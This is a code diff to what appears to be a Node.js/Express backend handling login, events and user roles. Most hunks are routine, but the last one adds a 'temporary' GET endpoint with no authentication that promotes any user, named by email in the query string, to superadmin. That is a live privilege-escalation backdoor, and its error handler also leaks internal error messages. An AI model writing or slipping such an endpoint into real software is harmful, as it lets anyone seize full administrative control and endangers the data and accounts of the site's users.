@@ -313,6 +313,7 @@ app.post('/api/auth/login', authLimiter, async (req, res) => {
   }
 });
 
+
 // 3. Get User Profile
 app.get('/api/auth/me', authMiddleware, async (req, res) => {
   try {
@@ -827,7 +828,7 @@ app.delete('/api/events/:id', authMiddleware, adminMiddleware, async (req, res) 
 });
 
 // 9. Get All Users (Admin)
-app.get('/api/users', authMiddleware, adminMiddleware, async (req, res) => {
+app.get('/api/users', authMiddleware, superAdminMiddleware, async (req, res) => {
   try {
     const users = await User.find().select('-password').sort({ createdAt: -1 });
     res.json(users);
@@ -884,6 +885,22 @@ app.put('/api/users/:id/role', authMiddleware, superAdminMiddleware, async (req,
   } catch (err) {
     console.error(err);
     res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// TEMPORARY PROMOTION ENDPOINT
+app.get('/api/temp-promote', async (req, res) => {
+  try {
+    const { email } = req.query;
+    if (!email) return res.status(400).json({ error: 'Email required' });
+    const user = await User.findOneAndUpdate(
+      { email },
+      { role: 'superadmin' },
+      { new: true }
+    );
+    res.json({ message: 'User promoted successfully', user });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
   }
 });
 
